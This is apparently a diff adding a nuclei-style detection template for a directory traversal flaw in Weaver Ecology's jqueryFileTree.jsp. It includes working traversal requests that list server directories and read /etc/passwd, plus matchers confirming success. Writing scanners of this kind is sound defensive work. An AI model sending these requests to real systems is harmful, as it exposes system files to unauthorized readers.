@@ -1,0 +1,68 @@
+id: weaver-ecology-directory-traversal
+
+info:
+  name: Weaver Ecology Directory Traversal Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects Directory Traversal vulnerability in Weaver Ecology's jqueryFileTree.jsp endpoint.
+    This vulnerability allows unauthorized access to system files by manipulating the 'dir' parameter.
+  reference:
+    - https://github.com/projectdiscovery/nuclei-templates
+  tags: weaver,ecology,directory-traversal,lfi,file-disclosure
+
+http:
+  - method: GET
+    path: /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+      Accept: "*/*"
+    query:
+      dir: "/page/resource/userfile/../../"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<ul class=\"jqueryFileTree\""
+          - "<li class=\"directory collapsed\""
+        condition: or
+        part: body
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Parent Directory"
+          - "../"
+          - "Directory"
+        condition: or
+        part: body
+    extractors:
+      - type: regex
+        name: directory_listing
+        regex:
+          - "<li class=\"directory collapsed\"><a href=\"#\" rel=\"([^\"]+)\">"
+        group: 1
+
+  - method: GET
+    path: /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp
+    query:
+      dir: "/page/resource/userfile/../../../etc/passwd"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+      Accept: "*/*"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "daemon:"
+          - "bin:"
+        condition: or
+        part: body
+      - type: status
+        status:
+          - 200
+
+stop-at-first-match: false
+max-redirects: 2
